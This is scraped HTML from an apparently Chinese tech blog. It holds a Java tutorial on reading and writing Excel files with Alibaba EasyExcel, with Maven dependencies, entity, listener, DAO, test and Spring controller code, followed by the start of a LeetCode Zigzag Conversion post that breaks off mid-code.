-          <h1 id="EasyExcel-Manual"><a href="#EasyExcel-Manual" class="headerlink" title="EasyExcel Manual"></a>EasyExcel Manual</h1><h2 id="一：引入依赖"><a href="#一：引入依赖" class="headerlink" title="一：引入依赖"></a>一：引入依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--excel操作工具--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>easyexcel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--日期格式化工具--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>joda-time<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>joda-time<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--实体工具--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--测试工具--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--json工具--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.19<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--spring web--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="二：代码模板"><a href="#二：代码模板" class="headerlink" title="二：代码模板"></a>二：代码模板</h2><h3 id="（1）实体类"><a href="#（1）实体类" class="headerlink" title="（1）实体类"></a>（1）实体类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.easyexcel.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.annotation.ExcelIgnore;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.annotation.ExcelProperty;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.EqualsAndHashCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@EqualsAndHashCode</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoData</span> &#123;</span><br><span class="line">    <span class="meta">@ExcelProperty(&quot;字符串标题&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String string;</span><br><span class="line">    <span class="meta">@ExcelProperty(&quot;日期标题&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br><span class="line">    <span class="meta">@ExcelProperty(&quot;数字标题&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Double doubleData;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 忽略这个字段</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ExcelIgnore</span></span><br><span class="line">    <span class="keyword">private</span> String ignore;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="（2）核心类"><a href="#（2）核心类" class="headerlink" title="（2）核心类"></a>（2）核心类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.easyexcel.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.domain.DemoData;</span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.dto.DemoDAO;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.context.AnalysisContext;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.read.listener.ReadListener;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.util.ListUtils;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 17:15 2022/11/20</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoDataListener</span> <span class="keyword">implements</span> <span class="title class_">ReadListener</span>&lt;DemoData&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BATCH_COUNT</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> List&lt;DemoData&gt; cachedDataList = ListUtils.newArrayListWithExpectedSize(BATCH_COUNT);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DemoDAO demoDAO;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DemoDataListener</span><span class="params">()</span> &#123;</span><br><span class="line">        demoDAO = <span class="keyword">new</span> <span class="title class_">DemoDAO</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DemoDataListener</span><span class="params">(DemoDAO demoDAO)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.demoDAO = demoDAO;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(DemoData data, AnalysisContext context)</span> &#123;</span><br><span class="line">        System.out.println(JSON.toJSONString(data));</span><br><span class="line">        cachedDataList.add(data);</span><br><span class="line">        <span class="keyword">if</span> (cachedDataList.size() &gt;= BATCH_COUNT) &#123;</span><br><span class="line">            saveData();</span><br><span class="line">            cachedDataList = ListUtils.newArrayListWithExpectedSize(BATCH_COUNT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doAfterAllAnalysed</span><span class="params">(AnalysisContext context)</span> &#123;</span><br><span class="line">        saveData();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">saveData</span><span class="params">()</span> &#123;</span><br><span class="line">        demoDAO.save(cachedDataList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="（3）传输层"><a href="#（3）传输层" class="headerlink" title="（3）传输层"></a>（3）传输层</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.easyexcel.dto;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.domain.DemoData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 17:16 2022/11/20</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoDAO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">(List&lt;DemoData&gt; list)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;insert&quot;</span> + list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="（4）本地读写"><a href="#（4）本地读写" class="headerlink" title="（4）本地读写"></a>（4）本地读写</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.easyexcel.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.common.DemoDataListener;</span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.domain.DemoData;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.EasyExcel;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.util.ListUtils;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 16:55 2022/11/20</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EasyTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;DemoData&gt; <span class="title function_">data</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;DemoData&gt; list = ListUtils.newArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="type">DemoData</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DemoData</span>();</span><br><span class="line">            data.setString(<span class="string">&quot;字符串&quot;</span> + i);</span><br><span class="line">            data.setDate(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">            data.setDoubleData(<span class="number">0.56</span>);</span><br><span class="line">            list.add(data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">relativelyPath</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">        System.out.println(relativelyPath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">PATH</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>) + <span class="string">&quot;\\data\\&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">simpleWrite</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> PATH + <span class="string">&quot;EasyTest.xlsx&quot;</span>;</span><br><span class="line">        EasyExcel.write(fileName, DemoData.class).sheet(<span class="string">&quot;模板&quot;</span>).doWrite(<span class="built_in">this</span>::data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">simpleRead</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> PATH + <span class="string">&quot;EasyTest.xlsx&quot;</span>;</span><br><span class="line">        EasyExcel.read(fileName, DemoData.class, <span class="keyword">new</span> <span class="title class_">DemoDataListener</span>()).sheet().doRead();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="（5）Web读写"><a href="#（5）Web读写" class="headerlink" title="（5）Web读写"></a>（5）Web读写</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.easyexcel.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.common.DemoDataListener;</span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.domain.DemoData;</span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.dto.DemoDAO;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.EasyExcel;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.util.ListUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> DemoDAO demoDao;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;DemoData&gt; <span class="title function_">data</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;DemoData&gt; list = ListUtils.newArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="type">DemoData</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DemoData</span>();</span><br><span class="line">            data.setString(<span class="string">&quot;字符串&quot;</span> + <span class="number">0</span>);</span><br><span class="line">            data.setDate(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">            data.setDoubleData(<span class="number">0.56</span>);</span><br><span class="line">            list.add(data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;download&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download</span><span class="params">(HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> URLEncoder.encode(<span class="string">&quot;测试&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>).replaceAll(<span class="string">&quot;\\+&quot;</span>, <span class="string">&quot;%20&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-disposition&quot;</span>, <span class="string">&quot;attachment;filename*=utf-8&#x27;&#x27;&quot;</span> + fileName + <span class="string">&quot;.xlsx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        EasyExcel.write(response.getOutputStream(), DemoData.class).sheet(<span class="string">&quot;模板&quot;</span>).doWrite(data());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;upload&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">upload</span><span class="params">(MultipartFile file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        EasyExcel.read(file.getInputStream(), DemoData.class, <span class="keyword">new</span> <span class="title class_">DemoDataListener</span>(demoDao)).sheet().doRead();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/12/LeetCode-Z%E5%AD%97%E5%BD%A2%E5%8F%98%E6%8D%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/12/LeetCode-Z%E5%AD%97%E5%BD%A2%E5%8F%98%E6%8D%A2/" class="post-title-link" itemprop="url">LeetCode_Z字形变换</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-12 22:38:41 / 修改时间：22:46:32" itemprop="dateCreated datePublished" datetime="2022-11-12T22:38:41+08:00">2022-11-12</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">算法练习</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Z-字形变换"><a href="#Z-字形变换" class="headerlink" title="Z 字形变换"></a>Z 字形变换</h1><h2 id="一：题目"><a href="#一：题目" class="headerlink" title="一：题目"></a>一：题目</h2><p>将一个给定字符串 <code>s</code> 根据给定的行数 <code>numRows</code> ，以从上往下、从左到右进行 Z 字形排列。</p>
-<p>比如输入字符串为 <code>&quot;PAYPALISHIRING&quot;</code> 行数为 <code>3</code> 时，排列如下：</p>
-<p><img src="/2022/11/12/LeetCode-Z%E5%AD%97%E5%BD%A2%E5%8F%98%E6%8D%A2/image-20221112223949179.png"></p>
-<p>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：<code>&quot;PAHNAPLSIIGYIR&quot;</code>。</p>
-<h2 id="二：实例"><a href="#二：实例" class="headerlink" title="二：实例"></a>二：实例</h2><p><strong>示例 1：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;PAYPALISHIRING&quot;, numRows = 3</span><br><span class="line">输出：&quot;PAHNAPLSIIGYIR&quot;</span><br></pre></td></tr></table></figure>
-
-<p><strong>示例 2：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;PAYPALISHIRING&quot;, numRows = 4</span><br><span class="line">输出：&quot;PINALSIGYAHRPI&quot;</span><br><span class="line">解释：</span><br><span class="line">P     I    N</span><br><span class="line">A   L S  I G</span><br><span class="line">Y A   H R</span><br><span class="line">P     I</span><br></pre></td></tr></table></figure>
-
-<p><strong>示例 3：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;A&quot;, numRows = 1</span><br><span class="line">输出：&quot;A&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="三：提示"><a href="#三：提示" class="headerlink" title="三：提示"></a>三：提示</h2><ul>
-<li><code>1 &lt;= s.length &lt;= 1000</code></li>
-<li><code>s</code> 由英文字母（小写和大写）、<code>&#39;,&#39;</code> 和 <code>&#39;.&#39;</code> 组成</li>
-<li><code>1 &lt;= numRows &lt;= 1000</code></li>
-</ul>
-<h2 id="四：算法实现"><a href="#四：算法实现" class="headerlink" title="四：算法实现"></a>四：算法实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 